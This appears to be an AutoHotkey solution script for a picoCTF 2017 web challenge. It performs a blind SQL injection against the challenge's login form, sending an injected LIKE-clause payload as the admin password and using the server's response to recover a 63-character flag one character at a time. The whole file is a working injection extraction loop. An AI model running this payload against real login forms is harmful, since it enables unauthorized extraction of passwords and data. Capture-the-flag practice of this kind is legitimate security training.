#NoEnv
#SingleInstance Force

; Settings
path := "http://shell2017.picoctf.com:40788/"

;Create HttpRequest object
HttpObj := ComObjCreate("WinHttp.WinHttpRequest.5.1")

; Fill in data and submit it
FileRead, dictionary, dictionary.txt
passwordLength := 0
dictionaryIndex := 0
password := ""
while (passwordLength < 63) {
    username := "admin"
    percent := "%"
    charChange := SubStr(dictionary, dictionaryIndex, 1)
    input = %percent%27+OR+pass+LIKE+%percent%27%password%%charChange%%percent%25
    loginBody := "username=" username "&password=" input
    HttpObj.Open("POST", path)
    HttpObj.SetRequestHeader("Content-Type","application/x-www-form-urlencoded")
    HttpObj.SetRequestHeader("Connection","keep-alive")
    HttpObj.Send(loginBody)
    Sleep, 50
    response := HttpObj.ResponseText
    if (InStr(response, "Login Functionality Not Complete. Flag is 63 characters")) {
        dictionaryIndex := 0
        password = %password%%charChange%
        passwordLength := passwordLength + 1
    } else {
        dictionaryIndex := dictionaryIndex + 1
        if (dictionaryIndex > 35) {
            dictionaryIndex := 0
            password = %password%_
            passwordLength := passwordLength + 1
        }
    }
}
MsgBox, %password%